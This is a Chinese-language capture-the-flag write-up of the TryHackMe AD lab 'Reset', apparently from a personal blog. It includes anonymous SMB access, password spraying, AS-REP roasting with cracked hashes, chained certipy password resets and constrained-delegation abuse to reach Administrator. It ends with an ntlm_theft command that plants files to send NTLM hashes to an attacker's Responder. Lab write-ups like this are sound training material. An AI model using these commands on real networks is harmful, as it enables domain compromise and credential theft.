---
title: THM_Reset From OSCPlike list.
date: 2025/09/20 14:54:00 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)，使用您指定的日期格式
# updated: YYYY/MM/DD HH:MM:SS # 可选，如果文章有更新日期，可以添加此字段
description: 从OSCPLike表单里面翻到的AD靶机。又触及了不少知识盲区。 # 从 Astro 的 description 转换
cover: /images/Reset_cover.png # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - OSCPLike
  - 渗透测试
  - AD域
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - Writeup
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
# password: your_secret_password # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---

## 机器概述

本文记录了对TryHackMe上一台OSCPlike AD靶机 "Reset" 的渗透测试过程。靶机涉及信息收集、SMB匿名访问、ASREProast攻击、Kerberos约束委派利用等多个知识点。

## 信息收集

### nmap扫描

首先，使用nmap对目标主机进行端口扫描，识别开放的服务。

```shell
Nmap scan report for 10.10.222.47
Host is up (0.21s latency).

PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
636/tcp open tcpwrapped
3269/tcp open tcpwrapped
3389/tcp open ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-19T06:40:04+00:00; -1s from scanner time.
| rdp-ntlm-info:
| Target_Name: THM
| NetBIOS_Domain_Name: THM
| NetBIOS_Computer_Name: HAYSTACK
| DNS_Domain_Name: thm.corp
| DNS_Computer_Name: HayStack.thm.corp
| DNS_Tree_Name: thm.corp
| Product_Version: 10.0.17763
|_ System_Time: 2025-09-19T06:39:25+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-09-18T06:27:04
|_Not valid after: 2026-03-20T06:27:04
7680/tcp open pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
| date: 2025-09-19T06:39:25
|_ start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 19 02:40:09 2025 -- 1 IP address (1 host up) scanned in 107.49 seconds
```

扫描结果显示目标主机开放了SMB、LDAP以及RDP等服务，域名为 `thm.corp`。其中 7680 端口的 `pando-pub` 服务未发现可利用信息，因此优先从SMB服务入手。

### smb信息

使用 `nxc` (NetExec) 枚举SMB共享，发现存在一个名为 `Data` 的共享，并且匿名用户具有读写权限。

```shell
└─$ nxc smb 10.10.239.10 --shares -u anonymous -p ''
SMB 10.10.239.10 445 HAYSTACK [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB 10.10.239.10 445 HAYSTACK [+] thm.corp\anonymous: (Guest)
SMB 10.10.239.10 445 HAYSTACK [*] Enumerated shares
SMB 10.10.239.10 445 HAYSTACK Share Permissions Remark
SMB 10.10.239.10 445 HAYSTACK ----- ----------- ------
SMB 10.10.239.10 445 HAYSTACK ADMIN$ Remote Admin
SMB 10.10.239.10 445 HAYSTACK C$ Default share
SMB 10.10.239.10 445 HAYSTACK Data READ,WRITE
SMB 10.10.239.10 445 HAYSTACK IPC$ READ Remote IPC
SMB 10.10.239.10 445 HAYSTACK NETLOGON Logon server share
SMB 10.10.239.10 445 HAYSTACK SYSVOL Logon server share
```

尝试使用 `smbclient` 连接该共享，发现一个奇怪的现象：`onboarding` 目录下的文件名会不断变化。这导致直接下载大文件（如PDF）时会失败。

```shell
┌──(kali㉿kali)-[~/THM/Reset]
└─$ smbclient //10.10.239.10/Data -U anonymous --password anonymous
Try "help" to get a list of possible commands.
smb: \> cd onboarding
smb: \onboarding\> ls
. D 0 Sat Sep 20 03:18:31 2025
.. D 0 Sat Sep 20 03:18:31 2025
5mvu24ei.1xv.pdf A 4700896 Mon Jul 17 04:11:53 2023
hjiofjsf.jve.pdf A 3032659 Mon Jul 17 04:12:09 2023
o3yagenz.2ed.txt A 521 Mon Aug 21 14:21:59 2023
...
smb: \onboarding\> ls
. D 0 Sat Sep 20 03:19:01 2025
.. D 0 Sat Sep 20 03:19:01 2025
3qe1mo2a.3el.pdf A 4700896 Mon Jul 17 04:11:53 2023
gscjtghz.glj.txt A 521 Mon Aug 21 14:21:59 2023
rysb2qtn.ddh.pdf A 3032659 Mon Jul 17 04:12:09 2023
```

为了解决这个问题，我将SMB共享挂载到本地文件系统，然后使用 `cp` 命令成功复制出了文件。
`sudo mount -t cifs //10.10.222.47/Data /mnt/smbshare -o user=anonymous,pass=`

成功获取的txt文件中包含了一封欢迎邮件，泄露了新员工的默认密码。

{% note info %}
Subject: Welcome to Reset -Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: **ResetMe123!** We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team
{% endnote %}

### nxc枚举

利用RID爆破获取用户名列表，再结合上一步得到的默认密码 `ResetMe123!` 进行密码喷洒，成功发现了一个有效账户 `lily_oneill`。

```shell
┌──(kali㉿kali)-[~/THM/Reset]
└─$ nxc smb 10.10.239.10 -u user.list -p 'ResetMe123!' --continue-on-success
SMB 10.10.239.10 445 HAYSTACK [+] thm.corp\LILY_ONEILL:ResetMe123! (Guest)
```
然而，经过进一步测试，发现该账户权限极低，无法进行有效操作。

### ASREProast攻击 (GetNPUsers)

此时，考虑到可能存在配置不当的域用户，我决定尝试ASREProast攻击。

{% note primary 'ASREProast 攻击原理' %}
[<sup>1</sup>](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) 是一个常用的脚本，用于查找域中设置了 "Do not require Kerberos preauthentication"（无需Kerberos预认证）属性的用户。

通常，用户在向KDC（密钥分发中心）请求TGT（票据授予票据）时，需要先用自己的密码哈希加密一个时间戳来进行“预认证”，以证明自己的身份。但如果某个账户（通常是服务账户）因为兼容性问题被禁用了预认证，攻击者就可以在不提供任何凭据的情况下，冒充该用户向KDC请求TGT。

虽然攻击者无法直接使用这个TGT，但TGT中包含了一部分用该用户原始密码的NT Hash加密的数据。攻击者可以提取这部分数据，并在本地进行离线破解，从而获取用户的明文密码。
{% endnote %}

使用 `GetNPUsers.py` 成功获取到了三个用户的TGT Hash。

```bash
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:42f7482d00e3c0662c681a93aeb417cb$4ba8...
$krb5asrep$23$TABATHA_BRITT@THM.CORP:c594656927cbbc10750b2719e70c81bc$41ef4...
$krb5asrep$23$LEANN_LONG@THM.CORP:0b4b2d255e25bd8dd032d56f2d463a3f$3de67...
```

将获取到的Hash交给 `hashcat` 进行破解，成功得到用户 `tabatha_britt` 的密码：`marlboro(1985)`。该用户拥有RDP登录权限。

## 立足点获取 & 权限提升

使用 `tabatha_britt` 的凭据成功RDP登录到目标主机 `HAYSTACK`。

![image-20250920160428753](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250920160428753.png)

虽然成功登录，但该用户仍然无法读取 `user.txt`。运行 `BloodHound` 收集域内信息并进行分析。

![image-20250920162559804](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250920162559804.png)

BloodHound的分析结果清晰地展示了一条从 `tabatha_britt` 到域管 `Administrator` 的攻击路径。

### To shawna & cruz & darla

本来想用genericall来创建影子票据的，但是好像没开pkint，所以直接无脑改密码好了

根据BloodHound的图谱，`tabatha_britt` 对用户 `SHAWNA_BRAY` 有 `GenericWrite` 权限，可以修改其密码。之后形成一条权限链，`SHAWNA_BRAY` -> `CRUZ_HALL` -> `DARLA_WINTERS`。我们依次利用 `certipy` 来重置这些用户的密码，控制它们。

```bash
certipy account update -user SHAWNA_BRAY -pass 'Asdfg591!' -u tabatha_britt -p 'marlboro(1985)' -dc-ip 10.10.239.10

certipy account update -user CRUZ_HALL -pass 'Asdfg591!' -u SHAWNA_BRAY -p 'Asdfg591!' -dc-ip 10.10.239.10

certipy account update -user DARLA_WINTERS -pass 'Asdfg591!' -u CRUZ_HALL -p 'Asdfg591!' -dc-ip 10.10.239.10
```

### To administrator

BloodHound显示用户 `DARLA_WINTERS` 被配置了到 `HAYSTACK$` 机器账户上 `cifs` 服务的约束委派（Constrained Delegation）。

{% note warning '约束委派攻击' %}
如果一个服务账户A被配置了到另一个服务B的约束委派，并且攻击者控制了账户A，那么攻击者就可以冒充**域内的任意用户**（包括域管，除非该用户被设置为“不可被委派”）去请求访问服务B。利用这个机制，我们可以冒充 `Administrator` 用户，请求一张访问 `HAYSTACK$` 上 `cifs` 服务的TGS票据，然后使用这张票据访问该机器的文件系统，从而实现提权。可以参考这篇文章：Constrained Delegation [<sup>4</sup>](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
{% endnote %}

利用 `getST.py` 和我们控制的 `DARLA_WINTERS` 账户，冒充 `Administrator` 用户，请求一张票据。

![image-20250920171048654](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250920171048654.png)

成功获取票据后，注入到当前会话中，即可获得对 `HAYSTACK` 机器的完全控制权，提权成功。

## 总结 & 碎碎念

对于Windows AD环境，ASREProasting 攻击应该作为信息收集阶段的优先检查项之一。

这个靶机整体难度不高，但由于对一些命令不熟悉，导致过程比较拖沓，花费了近两小时。假期家中事务繁忙，很久没有练习了。计划在接下来的一个月里，先把THM的OSCP like list靶机过一遍，然后再开HTB会员，专攻AD相关的Track。目标是两天一台靶机，三天一篇WP。

{% note heart %}
**师傅们有时间的话不要总是坐在电脑面前了，多回家陪陪家人叭！**
{% endnote %}

~~夜空中的星星又多了一颗，愿满天星斗为我指明方向！~~

## What if...

如果在立足点获取阶段没有想到ASREProast攻击，还有其他路吗？

是的。在SMB信息收集中，我们发现共享目录的文件名在不断变化，且我们有写入权限。这暗示了后台有自动程序在处理该目录的文件。

我们可以利用这个特性，创建一个恶意的LNK文件或SCF文件上传到该目录。当后台程序访问这个文件时，会触发并尝试连接我们指定的SMB服务器，从而通过 `Responder` 捕获到执行该程序的账户（`automate`）的Net-NTLMv2 hash。将捕获到的hash进行破解，即可获得该账户的密码，从而拿到 `user.txt`。这似乎是出题人预期的另一条路径。

可以使用的工具有 ntlm_theft [<sup>6</sup>](https://github.com/Greenwolf/ntlm_theft)。

```bash
# -s 指定Responder监听的IP, -f 指定要写入文件的SMB共享目录
ntlm_theft.py -g all -s <Your_IP> -f <FOLDER>
```
将生成的文件上传到 `onboarding` 目录，稍等片刻即可在 `Responder` 中收到hash。
